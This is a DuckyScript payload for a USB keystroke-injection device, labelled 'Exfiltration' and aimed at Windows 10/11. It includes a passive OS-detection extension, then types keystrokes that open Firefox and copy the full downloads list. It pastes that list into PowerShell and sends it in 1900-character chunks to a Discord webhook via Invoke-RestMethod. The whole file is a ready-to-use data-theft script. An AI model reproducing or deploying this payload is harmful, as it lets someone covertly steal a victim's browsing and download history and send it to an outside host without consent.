REM_BLOCK
###########################################################
#                                                         #
# Title        : Exports all the links of the downloads   #
# Author       : Aleff                                    #
# Version      : 1.0                                      #
# Category     : Exfiltration                             #
# Target       : Windows 10/11                            #
#                                                         #
###########################################################
END_REM

REM Requirements:
REM     - Firefox installed

REM You must define your Discord webhook if you want to use this method for the exfiltration
DEFINE #DISCORD_WEBHOOK example

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready.
        Does not require additional extensions.

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
        IF ($_OS == WINDOWS) THEN
            STRING HELLO WINDOWS!
        ELSE
            STRING HELLO WORLD!
        END_IF
    END_REM
END_EXTENSION

REM Open Firefox
GUI
DELAY 1000
STRING Firefox
DELAY 500
ENTER
DELAY 2000

REM Goto downloads and copy all
CTRL j
DELAY 500
CTRL a
DELAY 500
CTRL c
DELAY 500

REM Open a PowerShell and put all the links into $DOWNLOADS var
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $DOWNLOADS="
CTRL v
DELAY 500
ENTER

REM It depends on the number of links
DELAY 10000

STRINGLN "

REM Exfiltration using Discord Webhook
STRINGLN $WebhookUrl = "#DISCORD_WEBHOOK"

STRINGLN $Payload = @{content = $DOWNLOADS} | ConvertTo-Json

REM This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
STRINGLN

    $len = $DOWNLOADS.Length
    $MAX_LEN = 1900

    $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)

    for ($i = 0; $i -lt $ITERATIONS; $i++) {
        $init = $i * $MAX_LEN
        $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
        
        $sub = $DOWNLOADS.Substring($init, $end - $init)
        $Payload = @{content = $sub} | ConvertTo-Json

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
    }
    exit;

END_STRINGLN
